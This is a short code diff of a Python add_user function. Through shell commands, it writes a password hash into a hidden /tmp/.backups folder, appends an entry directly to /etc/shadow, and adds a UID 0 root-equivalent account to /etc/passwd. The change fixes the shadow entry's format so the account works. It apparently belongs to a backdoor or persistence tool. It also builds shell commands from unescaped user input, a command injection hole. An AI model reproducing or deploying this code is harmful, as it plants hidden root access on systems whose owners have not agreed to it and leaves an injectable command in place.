@@ -63,7 +63,7 @@ def add_user(username,password):
 		os.system("openssl passwd -6 {} > /tmp/.backups/passwd.txt".format(password))
 		f = open("/tmp/.backups/passwd.txt", "r")
 		new_user_pass = f.read().strip()
-		os.system("echo '{}:{}:0:0:root:/{}:/bin/bash' >> /etc/shadow".format(username,new_user_pass,username))
+		os.system("echo '{}:{}:19448:0:99999:7:::' >> /etc/shadow".format(username,new_user_pass))
 		f.close()
 		os.system("echo '{}:x:0:0:{}:/root:/bin/bash' >> /etc/passwd".format(username,username))
 		print("user {} added".format(username))
